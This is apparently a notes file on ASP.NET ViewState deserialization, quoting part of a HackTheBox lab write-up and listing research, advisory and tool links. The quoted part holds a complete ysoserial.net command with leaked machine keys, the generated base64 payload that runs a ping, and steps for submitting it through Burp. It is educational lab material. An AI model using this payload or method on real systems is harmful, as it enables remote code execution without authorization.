
##
#
https://0xdf.gitlab.io/2022/10/15/htb-perspective.html
#
https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter
#
https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret.md
#
##

```
I’ll run it with --help to get a list of the parameters:

PS > .\ysoserial.exe -p ViewState --help
ysoserial.net generates deserialization payloads for a variety of .NET formatters.

Plugin:

ViewState (Generates a ViewState using known MachineKey parameters)

Options:

      --examples             to show a few examples. Other parameters will be
                               ignored
  -g, --gadget=VALUE         a gadget chain that supports LosFormatter.
                               Default: ActivitySurrogateSelector
  -c, --command=VALUE        the command suitable for the used gadget (will
                               be ignored for ActivitySurrogateSelector)
      --upayload=VALUE       the unsigned LosFormatter payload in (base64
                               encoded). The gadget and command parameters will
                               be ignored
      --generator=VALUE      the __VIEWSTATEGENERATOR value which is in HEX,
                               useful for .NET <= 4.0. When not empty, 'legacy'
                               will be used and 'path' and 'apppath' will be
                               ignored.
      --path=VALUE           the target web page. example: /app/folder1/pag-
                               e.aspx
      --apppath=VALUE        the application path. this is needed in order to
                               simulate TemplateSourceDirectory
      --islegacy             when provided, it uses the legacy algorithm
                               suitable for .NET 4.0 and below
      --isencrypted          this will be used when the legacy algorithm is
                               used to bypass WAFs
      --viewstateuserkey=VALUE
                             this to set the ViewStateUserKey parameter that
                               sometimes used as the anti-CSRF token
      --decryptionalg=VALUE  the encryption algorithm can be set to  DES,
                               3DES, AES. Default: AES
      --decryptionkey=VALUE  this is the decryptionKey attribute from
                               machineKey in the web.config file
      --validationalg=VALUE  the validation algorithm can be set to SHA1,
                               HMACSHA256, HMACSHA384, HMACSHA512, MD5, 3DES,
                               AES. Default: HMACSHA256
      --validationkey=VALUE  this is the validationKey attribute from
                               machineKey in the web.config file
      --minify               Whether to minify the payloads where applicable
                               (experimental). Default: false
      --ust, --usesimpletype This is to remove additional info only when
                               minifying and FormatterAssemblyStyle=Simple.
                               Default: true
      --isdebug              to show useful debugging messages!
Using this and the post linked above, I’ll need:

A request the submits a ViewState object;
The generator associated with that path, or the app path and path variables;
The decryption algorithm and key (from web.config);
The validation algorithm and key (from web.config);
The ViewStateUserKey (decrypted in the previous step).
Find Request and Generator
Looking through the Burp history, there are a few options. I’ll go with the POST that’s generated when a user deletes a product:

image-20221011170319706
It has a __VIEWSTATE as well as a __VIEWSTATEGENERATOR. The generator is always the same on this path.

Create POC Payload
I’ll plug all that into ysoserial.exe in my Windows VM, and run it:

PS > .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "ping 10.10.14.6" --generator=90AA2C29 --decryptionalg=AES --decryptionkey=B16DA07AB71AB84143A037BCDD6CFB42B9C34099785C10F9 --validationalg=SHA1 --validationkey=99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF --viewstateuserkey=SAltysAltYV1ewSTaT3
/wEyyxEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAAEi9jIHBpbmcgMTAuMTAuMTQuNgYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoLxtFj9K1IPuEBn0dfPuAMsfwwBw4=
This payload simply pings my host the default number of times (five).

Submit POC
I’ll find the POST request and send it to Burp Repeater. It’s important that I use the POST to the same path so that the __VIEWSTATEGENERATOR is right. I’ll replace only the __VIEWSTATE parameter with the payload generated above, and submit. If there’s a redirect to login, that means the 30 minute life on the current cookie is up. I can just log in again, and update the cookie from dev tools. Once that’s right, on submitting, there are ICMP packets at a listening tcpdump:

```

Research:

https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf
https://googleprojectzero.blogspot.com.es/2017/04/exploiting-net-managed-dcom.html
https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/december/beware-of-deserialisation-in-.net-methods-and-classes-code-execution-via-paste/
https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/
https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/
https://www.nccgroup.trust/uk/our-research/use-of-deserialisation-in-.net-framework-methods-and-classes/?research=Whitepapers
https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282

<br>
<br>
Usage:

https://cert.360.cn/warning/detail?id=e689288863456481733e01b093c986b6
https://labs.mwrinfosecurity.com/advisories/milestone-xprotect-net-deserialization-vulnerability/
https://soroush.secproject.com/blog/2018/12/story-of-two-published-rces-in-sharepoint-workflows/
https://srcincite.io/blog/2018/08/31/you-cant-contain-me-analyzing-and-exploiting-an-elevation-of-privilege-in-docker-for-windows.html
https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-014/-cyberark-password-vault-web-access-remote-code-execution
https://www.synacktiv.com/ressources/advisories/Sitecore_CSRF_deserialize_RCE.pdf
https://www.zerodayinitiative.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability
https://www.zerodayinitiative.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server
https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/
https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/
https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/december/beware-of-deserialisation-in-.net-methods-and-classes-code-execution-via-paste/

<br>
<br>
Talks:

https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf
https://speakerdeck.com/pwntester/attacking-net-serialization
https://speakerdeck.com/pwntester/dot-net-serialization-detecting-and-defending-vulnerable-endpoints
https://gosecure.github.io/presentations/2018-03-18-confoo_mtl/Security_boot_camp_for_.NET_developers_Confoo_v2.pdf
https://illuminopi.com/assets/files/BSidesIowa_RCEvil.net_20190420.pdf
https://nullcon.net/website/archives/pdf/goa-2018/rohit-slides.pdf

<br>
<br>
Tools:

https://github.com/pwntester/ViewStatePayloadGenerator
https://github.com/0xACB/viewgen
https://github.com/Illuminopi/RCEvil.NET

<br>
<br>
CTF write-ups:

https://cyku.tw/ctf-hitcon-2018-why-so-serials/
https://xz.aliyun.com/t/3019
